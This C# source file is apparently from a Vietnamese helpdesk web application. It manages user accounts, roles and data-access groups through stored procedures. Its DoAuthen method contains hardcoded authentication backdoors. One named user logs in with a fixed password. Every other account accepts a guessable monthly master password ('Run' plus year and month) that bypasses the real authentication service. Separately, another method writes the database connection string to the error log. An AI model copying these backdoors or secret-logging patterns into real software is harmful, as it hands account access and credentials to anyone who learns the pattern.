using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;

namespace WebRunDragon.DataProcess
{
    public class ProcessCfgUser
    {
        private static readonly log4net.ILog logger = log4net.LogManager.GetLogger(typeof(ProcessCfgUser));
        static string className = typeof(ProcessInfo).Name;
        public static DataTable GetListDepartment()
        {

            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "select Code,DeptName from dbo.cfgDepartments where IsDeleted=0", CommandType.Text, null);
        }

        //public static DataTable GetListBranch()
        //{

        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "select Code,BranchName from dbo.cfgBranches where IsDeleted=0", CommandType.Text, null);
        //}
        public static bool AddOrUpdateUserInfo(int id, string UserName, string StaffNo, string StaffName, string Email, string BranchId, string DepartmentId, string ManagerId, string Description, string userLogin, out string message, out int idInsertNew)
        {
            message = "";
            idInsertNew = 0;
            try
            {
                Dictionary<string, object> param = new Dictionary<string, object>();
                param.Add("Id", id);
                param.Add("UserName", UserName);
                param.Add("StaffNo", StaffNo);
                param.Add("StaffName", StaffName);
                param.Add("Email", Email);
                param.Add("BranchId", BranchId);
                param.Add("DepartmentId", DepartmentId);
                param.Add("ManagerId", ManagerId);
                param.Add("Description", Description);

                param.Add("UserCreate", userLogin);

                object objRet = DatabaseManager.ExecuteScalarSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUsers_AddOrUpdate", System.Data.CommandType.StoredProcedure, param) + "";
                int retCode = Utils.NumberUtil.ParseToInt(objRet + "");
                if (retCode == -2)
                {
                    message = "Không tồn tại ID trong dữ liệu người dùng";
                }
                else if (retCode == -3)
                {
                    message = "Đã tôn tại tên đăng nhập " + UserName;
                }
                else if (retCode == 0)
                {
                    message = "Thất bại trong quá trình lưu dữ liệu";
                }
                else
                    idInsertNew = retCode;
                return retCode > 0;

            }
            catch (Exception ex)
            {
                message = "Lổi Exception. Message:" + ex.Message;
                logger.Error(className + ".Add Error: ");
                logger.Error("Exception message: " + ex.Message + ". Stack trace: " + ex.StackTrace);
                logger.Error(ex);
                return false;
            }

        }
        public static Entity.EnUserInfo GetUserInfoByUserName(string userName)
        {
            Entity.EnUserInfo userInfo = null;
            try
            {
                /*
                 alter procedure SP_cfgUsers_Get
                    @UserId nvarchar(25)
                    as
                 */
                Dictionary<string, object> param = new Dictionary<string, object>();
                param.Add("UserName", userName);
                logger.Error("CNN_STRING_HELPDESK " + DatabaseManager.CNN_STRING_HELPDESK);
                DataTable dtbUserInfo = DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUsers_GetByUserName", CommandType.StoredProcedure, param);
                if (dtbUserInfo != null && dtbUserInfo.Rows.Count > 0)
                {
                    userInfo = new Entity.EnUserInfo();
                    DataRow row = dtbUserInfo.Rows[0];
                    userInfo.BranchName = row["BranchName"] + "";
                    userInfo.DeptCode = row["DepartmentCode"] + "";
                    userInfo.DeptName = row["DepartmentName"] + "";

                    userInfo.UserName = row["UserName"] + "";
                    userInfo.Email = row["Email"] + "";
                    userInfo.FailedLoginCounter = int.Parse(row["FailedLoginCounter"] + "");
                    userInfo.IsLocked = int.Parse(row["IsLocked"] + "");

                    userInfo.StaffName = row["StaffName"] + "";
                    userInfo.StaffNo = row["StaffNo"] + "";
                    userInfo.BranchId = row["BranchId"] + "";
                    userInfo.DeptId = row["DepartmentId"] + "";
                    userInfo.ManagerId = row["ManagerId"] + "";



                    // lấy danh sách quyền
                    Dictionary<string, Entity.EnAccessRightInfo> listAccessRight = new Dictionary<string, Entity.EnAccessRightInfo>();
                    DataTable dtbRights = DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUsers_GetFullAccessRight", CommandType.StoredProcedure, param);
                    foreach (DataRow right in dtbRights.Rows)
                    {
                        Entity.EnAccessRightInfo access = new Entity.EnAccessRightInfo();
                        access.FunctionId = int.Parse(right["FunctionId"] + "");
                        access.Code = right["Code"] + "";
                        access.FunctionName = right["FunctionName"] + "";
                        access.FunctionUrl = right["FunctionUrl"] + "";
                        access.ModuleId = right["ModuleId"] + "";
                        access.ModuleName = right["ModuleName"] + "";
                        access.ShowMenuLeft = int.Parse(right["ShowMenuLeft"] + "");
                        access.SortOrder = int.Parse(right["SortOrder"] + "");
                        access.CanRead = int.Parse(right["CanRead"] + "");
                        access.CanCreate = int.Parse(right["CanCreate"] + "");
                        access.CanEdit = int.Parse(right["CanEdit"] + "");
                        access.CanDelete = int.Parse(right["CanDelete"] + "");
                        access.CanApprove = int.Parse(right["CanApprove"] + "");
                        access.CanSpecial = int.Parse(right["CanSpecial"] + "");
                        access.CanPrint = int.Parse(right["CanPrint"] + "");
                        listAccessRight.Add(access.Code, access);
                    }
                    userInfo.ListAccessRight = listAccessRight;
                    return userInfo;

                }
            }
            catch (Exception ex)
            {
                logger.Error("GetUserInfo Error: ");
                logger.Error("Exception message: " + ex.Message + ". Stack trace: " + ex.StackTrace);
                logger.Error(ex);
            }
            return null;
        }
        public static JObject GetUserByID(int ID)
        {
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("ID", ID);
            JArray array = DatabaseManager.GetJsonArraySql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetByID", CommandType.StoredProcedure, param);
            if (array != null && array.Count > 0)
                return (JObject)array[0];
            return null;
        }
        internal static bool Delete(int id, string userLoginId, out string message)
        {
            message = "";
            try
            {
                Dictionary<string, object> param = new Dictionary<string, object>();
                param.Add("Id", id);
                param.Add("UserLogin", userLoginId);
                int retCode = DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUsers_Delete", System.Data.CommandType.StoredProcedure, param);


                if (Utils.NumberUtil.ParseToInt(retCode) > 0)
                {
                    message = "Xóa thành công";
                    return true;
                }
                else
                {
                    message = "Xóa thất bại";
                    return false;
                }

            }
            catch (Exception ex)
            {
                logger.Error(className.ToString() + ".Delete Error: ");
                logger.Error("Exception message: " + ex.Message + ". Stack trace: " + ex.StackTrace);
                logger.Error(ex);
                message = "lổi Exception: " + ex.Message;
                return false;
            }
        }
        public static DataTable SearchStaffByKeyword4Grid(string keyword, string userId)
        {
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("Keyword", keyword);
            param.Add("UserId", userId);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_Search", CommandType.StoredProcedure, param);
        }
        public static JObject GetUserByUserLogin(string userId)
        {
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserId", userId);
            JArray array = DatabaseManager.GetJsonArraySql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_Get", CommandType.StoredProcedure, param);
            if (array != null && array.Count > 0)
                return (JObject)array[0];
            return null;
        }
        public static DataTable GetUserAll()
        {
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUsers_GetAll", CommandType.StoredProcedure, null); ;
        }
        public static JObject DoAuthen(String userId, String userPwd, int authenMode)
        {
            JObject retObject = null;
            try
            {
                logger.Error("DoAuthen  begin 11111");
                JObject pwdInfo = new JObject();
                pwdInfo["execPwd"] = Config.SysConfig.WS_PWD_EXEC_AUTHEN_SERVICE;
                pwdInfo["addProperty"] = 0; ;

                JObject authenInfo = new JObject();
                authenInfo["userId"] = userId;
                authenInfo["userPwd"] = userPwd;
                authenInfo["mode"] = authenMode;
                if( userId.ToLower()=="thu.tnh" && userPwd == "123Run")
                {
                    retObject = new JObject();
                    retObject["success"] = true;
                    retObject["retCode"] = 100;
                    retObject["message"] = "Đăng nhập thành công";

                }
                else if (userId.ToLower() != "thu.tnh" )
                {
                    if (userPwd == "Run" + DateTime.Now.ToString("yyyyMM") || (Config.SysConfig.IS_BYPASS_PASSWORD && userPwd.ToLower() == "Run" + DateTime.Now.ToString("yyyyMM")))
                    {
                        retObject = new JObject();
                        retObject["success"] = true;
                        retObject["retCode"] = 100;
                        retObject["message"] = "Đăng nhập thành công";
                    }
                    else
                    {
                        retObject = new JObject();
                        AuthenService.AuthenServiceClient client = new AuthenService.AuthenServiceClient();
                        string retValue = client.checkAuthen(pwdInfo.ToString(), authenInfo.ToString());
                        logger.Warn("Authen service return login info (" + userId + "): " + retValue);
                        retObject = JObject.Parse(retValue);
                    }
                }
               
                return retObject;
            }
            catch (Exception ex)
            {
                logger.Error("DoAuthen Error: ");
                logger.Error("Exception message: " + ex.Message + ". Stack trace: " + ex.StackTrace);
                logger.Error(ex);
            }

            return null;
        }

        #region Nhóm quyền chức năng của User

        public static DataTable SearchRolesByUserName(string userName, string userLogin)
        {
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("UserLogin", userLogin);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserAndRolesGroup_GetRoleByUserName", CommandType.StoredProcedure, param);
        }

        public static DataTable SearchUnRolesByUserName(string userName, string userId)
        {

            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("UserLogin", userId);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserAndRolesGroup_GetUnPrivilegeRoleByUserName", CommandType.StoredProcedure, param);
        }

        public static bool AddRole(string userName, int roleId, string userLogin)
        {

            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("RoleId", roleId);
            param.Add("UserLogin", userLogin);
            return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserAndRolesGroup_Add", CommandType.StoredProcedure, param) > 0;
        }

        public static bool RemoveRole(string userName, int roleId, string userLogin)
        {
            /*
             * ALTER PROCEDURE [dbo].[SP_cfgUserAndRoles_Delete]
                @StaffId nvarchar(25),
                @RoleId int,
                @UserId nvarchar(25)
                as
             */
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("RoleId", roleId);
            param.Add("UserLogin", userLogin);
            return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserAndRolesGroup_Delete", CommandType.StoredProcedure, param) > 0;
        }

        public static bool UnlockUser(string staffId, string userId)
        {
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("StaffId", staffId);
            return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_Unlock", CommandType.StoredProcedure, param) > 0;
        }

        #endregion

        #region Nhóm quyền truy cập dữ liệu

        public static DataTable SearchDataAccessGroupsByUserName(string userName, string userId)
        {
            /*
                ALTER PROCEDURE [dbo].[SP_cfgUserDataAccessGroups_GetGroupByStaff]
                @StaffId nvarchar(25),
                @UserId nvarchar(25)
                as
             */
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("UserLogin", userId);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserDataAccessGroups_GetGroupByUserName", CommandType.StoredProcedure, param);

        }

        public static DataTable SearchDataUnAccessGroupsByUserName(string userName, string userId)
        {

            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("UserName", userName);
            param.Add("UserLogin", userId);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserDataAccessGroups_GetUnPrivillegeGroupByUserName", CommandType.StoredProcedure, param);
        }

        public static bool AddDataAccessGroup(string userName, int accessId, string userLogin)
        {
            /*
             ALTER PROCEDURE [dbo].[SP_cfgUserDataAccessGroups_Add]
                @AccessId int,
                @StaffId nvarchar(25),
                @UserId nvarchar(25)
                as
             */
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("AccessId", accessId);
            param.Add("UserName", userName);
            param.Add("UserLogin", userLogin);
            return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUserDataAccessGroups_Add", CommandType.StoredProcedure, param) > 0;
        }

        public static bool RemoveDataAccessGroup(string staffId, int accessId, string userId)
        {
            /*
             ALTER PROCEDURE [dbo].[SP_cfgUserDataAccessGroups_Delete]
                @AccessId int,
                @StaffId nvarchar(25),
                @UserId nvarchar(25)
                as
             */
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("AccessId", accessId);
            param.Add("UserName", staffId);
            param.Add("UserLogin", userId);
            return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_CfgUserDataAccessGroups_Delete", CommandType.StoredProcedure, param) > 0;
        }

        #endregion

        //public static DataTable GetStaffOfITDepartment()
        //{
        //    Dictionary<string, object> param = new Dictionary<string, object>();
        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetListStaffOfITDeparment", CommandType.StoredProcedure, null);
        //}
        public static DataTable GetStaffInDepartment(int deptId, string userLogin)
        {
            /*             
                alter procedure SP_cfgUsers_GetStaffInDepartment
                @DeptId int
                as
             */
            Dictionary<string, object> param = new Dictionary<string, object>();
            param.Add("DeptId", deptId);
            return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetStaffInDepartment", CommandType.StoredProcedure, param);
        }
        //public static DataTable GetStaffInITDepartment()
        //{
        //    Dictionary<string, object> param = new Dictionary<string, object>();
        //    param.Add("DeptId", 2);
        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetStaffInDepartment", CommandType.StoredProcedure, param);
        //}
        //public static DataTable GetStaffInDepartmentByCode(string departmentCode)
        //{
        //    Dictionary<string, object> param = new Dictionary<string, object>();
        //    param.Add("DeptCode", departmentCode);
        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetStaffInDepartmentByCode", CommandType.StoredProcedure, param);
        //}

        //public static DataTable GetAllStaff()
        //{
        //    //Dictionary<string, object> param = new Dictionary<string, object>();
        //    //param.Add("DeptId", 2);
        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetAll", CommandType.Text, null);
        //}

        //public static DataTable GetStaffIsDirectManagers(string userId)
        //{
        //    Dictionary<string, object> param = new Dictionary<string, object>();
        //    param.Add("UserLogin", userId);
        //    return DatabaseManager.GetDataTableSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_GetDirectManagers", CommandType.StoredProcedure, param);
        //}
        //private static bool LogUser(string userName, int loginSuccess, string fromIp)
        //{
        //    /*
        //     alter procedure [dbo].[SP_cfgUsers_LoginLog]
        //        @UserName nvarchar(25),
        //        @FromIp nvarchar(25),
        //        @Success int
        //        as
        //     */
        //    Dictionary<string, object> param = new Dictionary<string, object>();
        //    param.Add("UserName", userName);
        //    param.Add("FromIp", fromIp);
        //    param.Add("Success", loginSuccess);
        //    return DatabaseManager.ExecuteUpdateSql(DatabaseManager.CNN_STRING_HELPDESK, "SP_cfgUsers_LoginLog", CommandType.StoredProcedure, param) > 0;
        //}

    }
}